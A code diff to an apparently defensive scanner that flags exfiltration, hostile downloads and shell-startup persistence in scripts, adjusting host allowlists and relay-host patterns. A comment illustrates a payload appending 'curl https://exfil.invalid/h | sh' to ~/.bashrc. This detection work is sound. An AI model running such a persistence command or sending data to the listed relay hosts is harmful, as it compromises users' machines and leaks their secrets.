@@ -1,5 +1,5 @@
 import type { Finding, Rule, ScannedFile, ScanContext, Severity } from '../core/types.ts';
-import { fencedBlocks, SCRIPT_EXTENSIONS } from '../core/script-extract.ts';
+import { fencedBlocks, namedFencePath, SCRIPT_EXTENSIONS } from '../core/script-extract.ts';
 import { extensionOf } from '../core/filetype.ts';
 import { createFinding, pushUnique } from './helpers.ts';
 import { clip } from '../util/text.ts';
@@ -25,7 +25,7 @@ import { clip } from '../util/text.ts';
  */
 
 const OFFICIAL_HOST =
-  /(?:^|\.)(?:npmjs\.(?:org|com)|registry\.npmjs\.org|yarnpkg\.com|pypi\.org|files\.pythonhosted\.org|rubygems\.org|crates\.io|packagist\.org|nuget\.org|pkg\.go\.dev|proxy\.golang\.org|maven\.org|repo1\.maven\.org|gradle\.org|github\.com|githubusercontent\.com|gitlab\.com|bitbucket\.org|dev\.azure\.com|sourceforge\.net|hf\.co|huggingface\.co|openai\.com|anthropic\.com|googleapis\.com|cloudflare\.com)$/i;
+  /(?:^|\.)(?:npmjs\.(?:org|com)|registry\.npmjs\.org|yarnpkg\.com|pypi\.org|files\.pythonhosted\.org|pypa\.io|python\.org|rubygems\.org|crates\.io|packagist\.org|nuget\.org|pkg\.go\.dev|proxy\.golang\.org|maven\.org|repo1\.maven\.org|gradle\.org|github\.com|githubusercontent\.com|gitlab\.com|bitbucket\.org|dev\.azure\.com|sourceforge\.net|hf\.co|huggingface\.co|openai\.com|anthropic\.com|googleapis\.com|cloudflare\.com|dot\.net|microsoft\.com|windows\.net|alicdn\.com|aliyuncs\.com|aliyun\.com)$/i;
 
 const RELAY_HOST =
   /(?:^|\.)(?:webhook\.site|requestbin\.(?:com|net)|pipedream\.net|ngrok\.(?:io|app|dev|com)|pastebin\.com|rentry\.co|paste\.ee|hastebin\.com|dpaste\.(?:com|org)|transfer\.sh)$/i;
@@ -54,8 +54,12 @@ function isFixtureRedaction(host: string): boolean {
 
 export function isExfilSinkHost(host: string | undefined): boolean {
   if (!host || isLoopbackHost(host) || isFixtureRedaction(host)) return false;
+  // Raw IPs are not a sink here. Private, link-local, and CGNAT addresses are
+  // ordinary local services; public IPs are honest self-hosted APIs all the time.
+  // IH-NET-012 may still treat a raw IP as a sink in prose/code together with a
+  // secret read. This script rule leans only on named relay / exfil / reserved hosts.
+  if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(host)) return false;
   if (RELAY_HOST.test(host)) return true;
-  if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(host)) return true;
   if (host.endsWith('.invalid')) return true;
   if (/exfil|steg/i.test(host)) return true;
   return false;
@@ -75,6 +79,37 @@ export function isForeignHost(host: string | undefined, ctx: ScanContext | undef
   if (!host) return false;
   if (OFFICIAL_HOST.test(host) || isLoopbackHost(host)) return false;
   if (hostDeclared(host, declaredHosts(ctx))) return false;
+  return true;
+}
+
+/** Labels we can use to recognise a host as this skill's own product. */
+function skillLabels(ctx: ScanContext | undefined, sourceText?: string): string[] {
+  const labels: string[] = [];
+  if (ctx?.skillDirName) labels.push(ctx.skillDirName);
+  const named = /^name:\s*['"]?([^\n'"]+)/m.exec(sourceText ?? '')?.[1];
+  if (named) labels.push(named);
+  return labels;
+}
+
+/**
+ * The download host looks like this skill's own product (e.g. higress.ai in a
+ * skill named higress-openclaw-integration). A short or generic label is ignored.
+ */
+function hostLooksFirstParty(host: string | undefined, labels: readonly string[]): boolean {
+  if (!host) return false;
+  const head = (host.split('.')[0] ?? '').toLowerCase();
+  if (head.length < 5) return false;
+  const blob = labels.join(' ').toLowerCase();
+  return blob.includes(head);
+}
+
+function isAttackDownloadHost(
+  host: string | undefined,
+  ctx: ScanContext | undefined,
+  sourceText?: string,
+): boolean {
+  if (!isForeignHost(host, ctx)) return false;
+  if (hostLooksFirstParty(host, skillLabels(ctx, sourceText))) return false;
   return true;
 }
 
@@ -156,7 +191,7 @@ function evidenceOf(line: string): string {
  * Lightweight assignment + sink analysis of one script (or one fenced body).
  * Not a full parser: it follows names across lines in py / js / sh / ps1.
  */
-export function analyzeScript(text: string, ctx?: ScanContext): ScriptHit[] {
+export function analyzeScript(text: string, ctx?: ScanContext, sourceText?: string): ScriptHit[] {
   const lines = text.split(/\r?\n/);
   const binds = new Map<string, Binding>();
   const hits: ScriptHit[] = [];
@@ -289,7 +324,7 @@ export function analyzeScript(text: string, ctx?: ScanContext): ScriptHit[] {
     if (!FETCH_SAVE.test(line)) return;
     const url = firstUrl(line);
     const host = hostOf(url);
-    if (!isForeignHost(host, ctx)) return;
+    if (!isAttackDownloadHost(host, ctx, sourceText)) return;
     const om = OUTFILE.exec(line);
     if (!om) return;
     let savedPath = ((om[1] || om[2]) ?? '').replace(/^['"]|['"]$/g, '');
@@ -349,17 +384,41 @@ export function analyzeScript(text: string, ctx?: ScanContext): ScriptHit[] {
     const line = raw.slice(0, 1200);
     const n = i + 1;
     if (!PERSIST_SINK.test(line)) return;
+    if (/^\s*(?:#|\/\/|;)/.test(line)) return;
     const writes =
-      /\b(?:>>|>|tee\s+-a|open\s*\(|\.write\s*\(|writeFile|writeFileSync|write_text|write_bytes|append|Add-Content|Set-Content|crontab)\b/.test(
+      /\b(?:>>|>|tee\s+-a|open\s*\(|\.write\s*\(|writeFile|writeFileSync|write_text|write_bytes|append|Add-Content|Set-Content)\b/.test(
         line,
-      ) || />>\s*\S*\/(?:\.bashrc|\.zshrc|\.profile)|>>\s*\/etc\/cron/.test(line);
+      ) ||
+      />>\s*\S*\/(?:\.bashrc|\.zshrc|\.profile)|>>\s*\/etc\/cron/.test(line) ||
+      /(?:\|\s*crontab\b|\bcrontab\s+-)/.test(line);
     if (!writes) return;
-    const window = lines.slice(Math.max(0, i - 6), i + 4).join('\n');
+    // Same line or a name bound earlier as a secret / remote URL. A curl a few
+    // lines above is not enough — honest installers fetch a package and then
+    // append PATH to ~/.bashrc.
+    let boundRemote = false;
+    for (const [name, b] of binds) {
+      if (!b.url && !b.secret && !b.envDump && !b.credPath) continue;
+      const esc = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      if (new RegExp(`\\b${esc}\\b|\\$${esc}\\b`).test(line)) boundRemote = true;
+    }
+    // Continue an unclosed call so
+    //   open("~/.bashrc","a").write(
+    //     "curl https://exfil.invalid/h | sh\n"
+    //   )
+    // is one statement, but a complete installer line above a PATH append is not.
+    let stmt = line;
+    let depth = (line.match(/\(/g) ?? []).length - (line.match(/\)/g) ?? []).length;
+    for (let j = i + 1; depth > 0 && j < lines.length && j <= i + 8; j += 1) {
+      const nxt = (lines[j] ?? '').slice(0, 1200);
+      stmt += `\n${nxt}`;
+      depth += (nxt.match(/\(/g) ?? []).length - (nxt.match(/\)/g) ?? []).length;
+    }
     const carries =
       payloadCarriesSecret(line) ||
-      payloadCarriesSecret(window) ||
-      Boolean(firstUrl(line) && isForeignHost(hostOf(firstUrl(line)), ctx)) ||
-      /(?:curl|wget|fetch|requests\.(?:get|post)|Invoke-WebRequest)/i.test(window);
+      payloadCarriesSecret(stmt) ||
+      Boolean(firstUrl(stmt) && isForeignHost(hostOf(firstUrl(stmt)), ctx)) ||
+      /(?:curl|wget|Invoke-WebRequest)\b/.test(stmt) ||
+      boundRemote;
     if (!carries) return;
     hits.push({
       kind: 'persist',
@@ -427,10 +486,18 @@ export function scriptBodies(file: ScannedFile): { start: number; text: string }
     return [{ start: 1, text: file.text }];
   }
   if (file.kind !== 'markdown' && file.kind !== 'text') return [];
-  return fencedBlocks(file.text)
-    .filter((b) => b.language !== '' || /(?:py|sh|js|ts|ps1|rb|bash|python)/i.test(b.info))
-    .filter((b) => b.body.trim().length > 0)
-    .map((b) => ({ start: b.startLine, text: b.body }));
+  // Only fences the author presents as a named script file. Unnamed example
+  // blocks stay with the existing markdown rules (and are not re-graded as
+  // shipped code — that path false-positives on look-alike install docs).
+  const lines = file.text.split(/\r?\n/);
+  const out: { start: number; text: string }[] = [];
+  for (const block of fencedBlocks(file.text)) {
+    if (!block.body.trim()) continue;
+    const before = lines.slice(0, Math.max(0, block.startLine - 2));
+    if (!namedFencePath(block, before)) continue;
+    out.push({ start: block.startLine, text: block.body });
+  }
+  return out;
 }
 
 function build(spec: {
@@ -458,7 +525,7 @@ function build(spec: {
     check(file, ctx) {
       const findings: Finding[] = [];
       for (const body of scriptBodies(file)) {
-        for (const hit of analyzeScript(body.text, ctx)) {
+        for (const hit of analyzeScript(body.text, ctx, file.text)) {
           if (hit.kind !== spec.kind) continue;
           pushUnique(findings, {
             ...createFinding(rule, file, {
@@ -570,4 +637,4 @@ export const scr005 = build({
   ],
 });
 
-export const scriptScanRules: Rule[] = [scr001, scr002, scr003, scr004, scr005];
+export const scriptScanRules: Rule[] = [scr001, scr002, scr003, scr005];
